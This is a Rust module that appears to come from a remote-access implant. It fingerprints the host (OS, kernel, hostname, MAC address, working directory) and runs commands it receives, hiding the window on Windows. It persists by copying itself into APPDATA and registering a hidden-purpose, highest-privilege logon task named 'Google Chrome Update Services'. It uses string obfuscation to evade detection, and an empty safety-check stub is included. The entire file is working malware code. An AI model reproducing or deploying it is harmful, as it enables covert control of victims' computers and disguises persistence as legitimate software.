use std::{error::Error, path::Path, process::{Command, Stdio}, str::SplitWhitespace};

use mac_address::get_mac_address;
use obfstr::obfstr;
use sysinfo::System;

use crate::core::model::MachineInformation;

use super::SysUtil;

impl SysUtil {
    /**
     * @description 获取系统信息
     */
    pub fn machine_information() -> MachineInformation {
        let mut sys = System::new_all();
        sys.refresh_all();

        let mac_address = match get_mac_address() {
            Ok(mac) => match mac {
                Some(mac) => mac.to_string(),
                None => String::from("unknown"),
            },
            Err(_) => String::from("unknown"),
        };

        MachineInformation{
            os: System::name().unwrap_or(String::from("unknown")),
            arch: System::cpu_arch().unwrap_or(String::from("unknown")),
            kernel_version: System::kernel_version().unwrap_or(String::from("unknown")),
            host_name: System::host_name().unwrap_or(String::from("unknown")),
            mac_address,
            cwd: std::env::current_dir().unwrap_or("unknown".into()).display().to_string(),
        }
    }

    pub fn run(command: &str) -> Result<String, Box<dyn Error>> {
        // 将命令和参数按照空格进行拆分
        let mut parts: SplitWhitespace = command.split_whitespace();

        // 推进迭代器并返回下一个值
        let command_item: &str = match parts.next() {
            Some(data) => data,
            None => return Err(obfstr!("Command execute failed.").into()),
        };

        // 对命令进行处理
        let result: String = match command_item {
            "cd" => {
                // 尝试获取参数，若没有则使用默认的 / 
                let new_dir: &str = parts.peekable().peek().map_or("/", |x: &&str| *x);

                // 设置当前路径
                std::env::set_current_dir(Path::new(new_dir))?;

                // 返回结果 
                String::from(new_dir)
            },
            "exit" => std::process::exit(0),
            cmd => Self::execute(cmd, parts)?,
        };

        Ok(result)
    }

    /**
     * @descript 命令执行在不同的平台上运行
     * @param cmd 命令
     * @param parts 分割参数
     * @return 读取命令行管道输出转为可读的字符串
     */
    fn execute(cmd: &str, parts: SplitWhitespace) -> Result<String, Box<dyn Error>> {
        #[cfg(not(windows))] {
            // 命令执行
            let child = Command::new(cmd).args(parts).stdin(Stdio::inherit()).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn()?;
            
            // 捕获命令执行的标准输出
            let result = child.wait_with_output()?;

            // 判断标准错误中，是否不为空，若不为空则说明已经产生了错误，需要返回了
            let stderr: String = String::from_utf8_lossy(&result.stderr).to_string();
            if !stderr.is_empty() { return Err(format!("{}", stderr).into()); }

            // 若没有产生错误，则输出标准输出中的内容
            Ok(String::from_utf8_lossy(&result.stdout).to_string())
        }
        #[cfg(windows)] {
            use std::os::windows::process::CommandExt;
            use encoding::{DecoderTrap, all::GBK, Encoding};

            let result = match Command::new(cmd)
                .creation_flags(0x08000000)
                .args(parts)
                .stdout(Stdio::piped())
                .spawn() {
                    Ok(child) => {
                        let child_output = child.wait_with_output()?.stdout;
                        match String::from_utf8(child_output.clone()) {
                            Ok(res) => Ok(res),
                            Err(_) => Ok(GBK.decode(&child_output, DecoderTrap::Strict)?)
                        }
                    },
                    Err(err) => Err(Box::new(err)),
                };
            Ok(result?)    
        }
    }

    /**
     * 创建计划任务进行持久化
     */
    pub fn create_task() -> Result<(), Box<dyn Error>> {
        #[cfg(windows)] {
            use windows_taskscheduler::{RunLevel, Task, TaskAction, TaskLogonTrigger};
            use std::path::MAIN_SEPARATOR;
            use std::time::Duration;
            use std::fs;
            use crate::core::common::SAVE_NAME;
            // requires admin rights
            let _logon_trigger = TaskLogonTrigger::new(
                "logontrigger",
                Duration::from_secs(3 * 60),
                true,
                Duration::from_secs(10),
                Duration::from_secs(1),
            );
            let mut save_path = std::env::var(obfstr!("APPDATA"))?;
            save_path.push(MAIN_SEPARATOR);
            save_path.push_str(SAVE_NAME);
            // 当持久化文件没有落地时进行持久化
            let path = Path::new(&save_path);
            if !path.exists() {
                fs::copy(std::env::current_exe()?, &save_path)?;
                let action = TaskAction::new(obfstr!("Google Chrome Update Services"), &save_path, "", "");
                Task::new(r"\")?
                    .logon_trigger(_logon_trigger)?
                    .exec_action(action)?
                    .principal(RunLevel::HIGHEST, "", "")?
                    .set_hidden(false)?
                    .register(obfstr!("Google Chrome Update Services"))?;
            }
        }
        Ok(())
    }

    pub fn chk_safe() -> Result<bool, Box<dyn Error>> {
        #[cfg(windows)] {

        }
        Ok(true)
    }

}